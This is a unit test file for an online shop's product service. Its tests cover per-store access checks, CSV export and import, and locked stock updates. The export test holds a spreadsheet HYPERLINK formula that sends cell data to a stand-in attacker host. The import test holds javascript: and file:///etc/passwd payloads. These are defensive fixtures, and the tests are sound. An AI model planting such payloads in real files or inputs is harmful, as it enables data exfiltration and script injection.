import { beforeEach, describe, expect, test, vi } from "vite-plus/test";

const db = vi.hoisted(() => ({
  shopCollection: { count: vi.fn(), findMany: vi.fn(async () => []) },
  shopProduct: { create: vi.fn(), findMany: vi.fn(), updateMany: vi.fn(), findFirst: vi.fn() },
  shopVariant: {
    findFirst: vi.fn(async () => null),
    findUniqueOrThrow: vi.fn(),
    update: vi.fn(),
  },
  $queryRaw: vi.fn(),
  $transaction: vi.fn(),
  shopInventoryMovement: { createMany: vi.fn(), create: vi.fn() },
}));
const queue = vi.hoisted(() => ({ enqueueCatalogPublish: vi.fn() }));

vi.mock("../../../utils/prisma.js", () => ({ default: db }));
vi.mock("../../../workers/bullmq/queues/shop.queue.js", () => queue);

const { bulkSetStatus, createProduct, exportProductsCsv, importProductsCsv, setStock } =
  await import("./products.service.js");

beforeEach(() => vi.clearAllMocks());

describe("collections from the request", () => {
  const input = {
    title: "Mug",
    variants: [{ title: "Default", price: 10 }],
    collectionIds: ["mine", "theirs"],
  };

  test("another store's collection is refused before anything is written", async () => {
    db.shopCollection.count.mockResolvedValue(1);
    await expect(createProduct({ id: "s1", orgId: "o" }, input as never)).rejects.toMatchObject({
      code: "INVALID",
    });
    expect(db.shopCollection.count).toHaveBeenCalledWith({
      where: { storeId: "s1", id: { in: ["mine", "theirs"] } },
    });
    expect(db.shopProduct.create).not.toHaveBeenCalled();
  });

  test("the store's own collections are linked", async () => {
    db.shopCollection.count.mockResolvedValue(2);
    db.shopProduct.create.mockResolvedValue({ id: "p1", variants: [] });
    await createProduct({ id: "s1", orgId: "o" }, input as never);
    expect(db.shopProduct.create).toHaveBeenCalled();
  });
});

describe("bulk status", () => {
  test("republishes only the store's own products", async () => {
    db.shopProduct.findMany.mockResolvedValue([{ id: "p1" }]);
    await bulkSetStatus("s1", ["p1", "someone-elses"], "DRAFT");
    expect(queue.enqueueCatalogPublish).toHaveBeenCalledTimes(1);
    expect(queue.enqueueCatalogPublish).toHaveBeenCalledWith("p1");
  });
});

describe("product export", () => {
  test("a formula in a product's text is written as text", async () => {
    db.shopProduct.findMany.mockResolvedValue([
      {
        title: '=HYPERLINK("http://evil.test/?"&A2,"x")',
        description: "@SUM(1,2)",
        status: "ACTIVE",
        images: [],
        collections: [{ name: "+Sale" }],
        variants: [
          {
            title: "-Small",
            sku: "\tSKU",
            price: "10",
            compareAtPrice: null,
            trackInventory: false,
            stock: 0,
            imageUrl: null,
          },
        ],
      },
    ]);
    const [, row] = (await exportProductsCsv("s1")).split("\n");
    expect(row.startsWith(`"'=HYPERLINK`)).toBe(true);
    expect(row).toContain("'-Small");
    expect(row).toContain("'\tSKU");
    expect(row).toContain("'+Sale");
    expect(row).toContain("'@SUM(1,2)");
  });
});

describe("importing a CSV", () => {
  test("an Image that isn't a web link is refused like the product form refuses it", async () => {
    db.shopProduct.findFirst.mockResolvedValue(null);
    const csv = [
      "Product,Price,Image",
      "Mug,10,javascript:alert(1)",
      "Plate,12,file:///etc/passwd",
    ].join("\n");
    const result = await importProductsCsv({ id: "s1", orgId: "o" }, csv);
    expect(result.created).toBe(0);
    expect(result.skipped.map((s) => s.product)).toEqual(["Mug", "Plate"]);
    expect(db.shopProduct.create).not.toHaveBeenCalled();
  });

  test("a web image link goes through", async () => {
    db.shopProduct.findFirst.mockResolvedValue(null);
    db.shopCollection.count.mockResolvedValue(0);
    db.shopProduct.create.mockResolvedValue({ id: "p1", variants: [] });
    const result = await importProductsCsv(
      { id: "s1", orgId: "o" },
      "Product,Price,Image\nMug,10,https://cdn.example.com/mug.jpg",
    );
    expect(result.created).toBe(1);
  });
});

describe("setting a stock count", () => {
  test("moves by the difference from the count read under the lock, not the earlier read", async () => {
    const v = { id: "v1", productId: "p1", stock: 10, trackInventory: true };
    db.shopVariant.findFirst.mockResolvedValueOnce(v as never);
    db.$transaction.mockImplementation((fn: (tx: typeof db) => unknown) => fn(db));
    // A sale took 3 between the first read and the lock.
    db.$queryRaw.mockResolvedValue([{ stock: 7 }]);
    db.shopVariant.findUniqueOrThrow.mockResolvedValue({ ...v, stock: 7 });
    db.shopVariant.update.mockResolvedValue({ ...v, stock: 12 });
    await setStock("s1", "v1", 12);
    expect(db.shopVariant.update).toHaveBeenCalledWith({
      where: { id: "v1" },
      data: { stock: { increment: 5 } },
    });
  });
});
